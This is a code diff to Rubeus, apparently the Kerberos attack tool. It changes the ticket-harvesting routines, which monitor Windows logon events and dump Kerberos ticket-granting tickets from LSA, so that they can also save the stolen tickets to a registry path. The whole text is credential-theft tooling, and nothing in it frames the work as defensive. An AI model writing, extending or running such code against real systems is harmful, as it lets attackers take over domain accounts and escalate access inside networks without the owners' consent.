@@ -9,7 +9,7 @@ namespace Rubeus
 {
     public class Harvest
     {
-        public static void HarvestTGTs(int intervalMinutes)
+        public static void HarvestTGTs(int intervalMinutes, string registryBasePath)
         {
             // First extract all TGTs then monitor the event log (indefinitely) for 4624 logon events
             //  every 'intervalMinutes' and dumps TGTs JUST for the specific logon IDs (LUIDs) based on the event log.
@@ -133,12 +133,15 @@ namespace Rubeus
 
                 Console.WriteLine("\r\n[*] {0} - Current usable TGTs:\r\n", DateTime.Now);
                 LSA.DisplayTGTs(creds);
-
+                if (registryBasePath != null)
+                {
+                    LSA.SaveTicketsToRegistry(creds, registryBasePath);
+                }
                 System.Threading.Thread.Sleep(intervalMinutes * 60 * 1000);
             }
         }
 
-        public static void Monitor4624(int intervalSeconds, string targetUser)
+        public static void Monitor4624(int intervalSeconds, string targetUser, string registryBasePath = null)
         {
             // monitors the event log (indefinitely) for 4624 logon events every 'intervalSeconds' and dumps TGTs JUST for the specific
             //  logon IDs (LUIDs) based on the event log. Can optionally only extract for a targeted user.
@@ -224,7 +227,7 @@ namespace Rubeus
                                         {
                                             seenLUIDs[luid] = true;
                                             // if we haven't seen it, extract any TGTs for that particular logon ID
-                                            LSA.ListKerberosTicketData(luid, "krbtgt", true);
+                                            LSA.ListKerberosTicketData(luid, "krbtgt", true, registryBasePath);
                                         }
                                     }
                                     catch (Exception e)
